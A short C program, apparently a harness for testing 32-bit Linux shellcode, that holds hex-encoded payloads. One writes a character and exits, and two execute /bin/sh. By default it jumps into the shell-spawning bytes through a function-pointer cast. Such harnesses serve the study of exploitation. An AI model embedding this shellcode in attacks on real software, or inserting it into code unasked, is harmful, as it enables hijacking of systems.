/*
 * Works on 32 bit systems.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define USE_C				1
#define USE_INLINE_ASSEMBLY		2
#define USE_SHELLCODE			3

#define CALL_TYPE			USE_SHELLCODE

static char *shellcode_write = \
"\x31\xdb\x31\xd2\x31\xc0\x6a\x41\xfe\xc3"
"\x89\xe1\xfe\xc2\xb0\x04\xcd\x80\x31\xdb"
"\xb0\x01\xcd\x80";

static char *shellcode_exec = \
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";

static char *shellcode_exec_sh = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

int main(void)
{
#if CALL_TYPE == USE_INLINE_ASSEMBLY
	__asm__ (
			"xor %ebx,%ebx\n\t"
			"xor %edx,%edx\n\t"
			"xor %eax,%eax\n\t"
			"pushl $0x41\n\t"
			"inc %bl\n\t"
			"movl %esp, %ecx\n\t"
			"inc %dl\n\t"
			"mov $4, %al\n\t"
			"int $0x80\n\t"
		);
	__asm__(
			"xor %ebx, %ebx\n\t"
			"mov $1, %al\n\t"
			"int $0x80\n\t"
	       );
#elif CALL_TYPE == USE_C
	write(1, "a", 1);
	exit(EXIT_SUCCESS);
#else
	printf("shellcode length: %zu\n", strlen(shellcode_exec));
	(*(void (*)()) shellcode_exec)();
#endif

	return 0;
}
